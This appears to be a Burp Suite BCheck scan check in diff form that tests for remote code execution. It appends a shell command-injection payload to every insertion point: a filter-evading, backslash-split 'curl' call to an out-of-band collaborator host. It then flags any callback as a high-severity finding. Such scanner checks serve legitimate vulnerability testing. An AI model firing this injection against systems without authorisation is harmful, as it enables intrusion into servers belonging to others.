@@ -1,0 +1,16 @@
+metadata:
+language: v1-beta
+name: "rce"
+description: "rce"
+author: "chain00x"
+
+given insertion point then
+	send payload:
+		appending: `'&cu\\rl https://{generate_collaborator_address()}/'`
+			if any interactions then
+				report issue:
+				severity: high
+				confidence: firm
+				detail: "rce"
+				remediation: "rce"
+				end if
